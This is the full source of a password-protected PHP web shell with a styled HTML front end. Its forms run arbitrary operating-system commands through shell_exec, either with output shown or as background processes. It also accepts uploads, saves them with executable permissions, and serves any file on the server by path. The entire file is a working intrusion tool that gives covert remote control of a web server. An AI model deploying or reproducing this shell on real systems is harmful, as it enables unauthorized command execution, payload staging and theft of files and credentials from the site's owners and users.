<?php
// Start a session to keep the authentication state
session_start();

// Check if the correct password is entered using hashes to not hard code password
if (!isset($_SESSION['authenticated']) || $_SESSION['authenticated'] !== true) {
    if (isset($_POST['password']) && password_verify($_POST['password'], '$2y$10$fGB8ePC23HmGz85gHqzI/.yABVntmUKpEsuVyY1sM9JJk6E8541p6')) {
        $_SESSION['authenticated'] = true;
    } else {
        // Show login form if the password is not correct or not entered
        echo '<form method="POST" style="max-width: 300px; margin: auto; padding: 20px; border: 1px solid #ddd; box-shadow: 0 2px 5px rgba(0, 0, 0, 0.2);">
                <h2 style="text-align: center; font-family: Arial, sans-serif;">Login</h2>
                <input type="password" name="password" placeholder="Enter Password" required style="width: 100%; padding: 10px; margin-bottom: 10px; border: 1px solid #ddd; border-radius: 4px;">
                <input type="submit" value="Login" style="width: 100%; padding: 10px; background-color: #28a745; border: none; border-radius: 4px; color: white; cursor: pointer;">
              </form>';
        exit();
    }
}

// Handle command execution (synchronous commands with output)
if (isset($_POST['command'])) {
    $command = $_POST['command'];
    $output = shell_exec($command . ' 2>&1');
    echo "<pre style='background-color: #f8f9fa; padding: 10px; border: 1px solid #ddd; border-radius: 4px;'>$output</pre>";
}

// Handle long-running process execution (asynchronous, no output)
if (isset($_POST['background_command'])) {
    $background_command = $_POST['background_command'];
    $background_command .= ' > /dev/null 2>&1 & echo $!';
    $pid = shell_exec($background_command);
    echo "<p style='color: green;'>Background process started with PID: $pid</p>";
}

// Handle file upload with error checking
if (isset($_FILES['file'])) {
    $destination = basename($_FILES['file']['name']);
    if ($_FILES['file']['error'] === UPLOAD_ERR_OK) {
        if (move_uploaded_file($_FILES['file']['tmp_name'], $destination)) {
            // Set the file permissions to 755
            chmod($destination, 0755);
            echo "<p style='color: green;'>File uploaded successfully: $destination</p>";
        } else {
            echo "<p style='color: red;'>Failed to move uploaded file. Check permissions.</p>";
        }
    } else {
        echo "<p style='color: red;'>Error during file upload: " . $_FILES['file']['error'] . "</p>";
    }
}

// Handle file download
if (isset($_GET['download'])) {
    $file = $_GET['download'];
    if (file_exists($file)) {
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . basename($file) . '"');
        header('Content-Length: ' . filesize($file));
        readfile($file);
        exit;
    } else {
        echo "<p style='color: red;'>File does not exist.</p>";
    }
}
?>

<!DOCTYPE html>
<html>
<head>
    <title>PHP Web Shell</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 20px;
            background-color: #f4f4f9;
            color: #333;
        }
        h1 {
            text-align: center;
            color: #444;
        }
        form {
            max-width: 500px;
            margin: 20px auto;
            padding: 20px;
            border: 1px solid #ddd;
            border-radius: 5px;
            background: #fff;
            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
        }
        input[type="text"], input[type="file"], input[type="password"] {
            width: calc(100% - 22px);
            padding: 10px;
            margin: 10px 0;
            border: 1px solid #ddd;
            border-radius: 4px;
        }
        input[type="submit"] {
            width: 100%;
            padding: 10px;
            background-color: #007bff;
            border: none;
            border-radius: 4px;
            color: white;
            cursor: pointer;
            transition: background-color 0.3s ease;
        }
        input[type="submit"]:hover {
            background-color: #0056b3;
        }
        pre {
            white-space: pre-wrap; 
            word-wrap: break-word;
        }
    </style>
</head>
<body>
    <h1>PHP Web Shell</h1>

    <!-- Command execution form for synchronous commands -->
    <form method="POST">
        <input type="text" name="command" placeholder="Enter command" required>
        <input type="submit" value="Execute">
    </form>

    <!-- New form for running background processes -->
    <form method="POST">
        <input type="text" name="background_command" placeholder="Enter command to run in the background" required>
        <input type="submit" value="Run in Background">
    </form>

    <!-- File upload form -->
    <form method="POST" enctype="multipart/form-data">
        <input type="file" name="file" required>
        <input type="submit" value="Upload">
    </form>

    <!-- File download form -->
    <form method="GET">
        <input type="text" name="download" placeholder="Enter filename to download" required>
        <input type="submit" value="Download">
    </form>
</body>
</html>
